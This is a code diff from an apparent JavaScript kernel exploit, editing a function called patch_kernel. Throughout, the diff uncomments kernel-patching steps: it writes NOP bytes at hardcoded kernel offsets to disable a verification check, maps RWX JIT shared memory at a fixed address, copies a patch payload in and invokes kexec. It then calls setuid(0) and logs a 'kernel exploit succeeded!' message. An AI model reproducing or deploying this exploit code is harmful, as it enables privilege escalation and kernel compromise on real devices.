@@ -1539,7 +1539,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
   //__________PATCH KERNEL__________
 
-/*
+
     
 //veriPatch
  kmem.write16(kbase.add(0x626874), 0x9090);
@@ -1599,7 +1599,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   //__________PATCH KERNEL__________
 
 
-    */
+  
 
 
     
@@ -1616,12 +1616,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         die('patch file size is zero');
     }
     map_size = map_size+page_size & -page_size;
-*/
-    const prot_rwx = 7;
+
+  const prot_rwx = 7;
     const prot_rx = 5;
     const prot_rw = 3;
     const exec_p = new Int(0, 9);
-    const write_p = new Int(max_size, 9);
+    const write_p = new Int(0x10000000, 9);
     const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
     const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);
 
@@ -1674,7 +1674,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     mem.cpy(write_addr, patches.addr, patches.size);
     sys_void('kexec', exec_addr, ...restore_info);
-
+*/
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
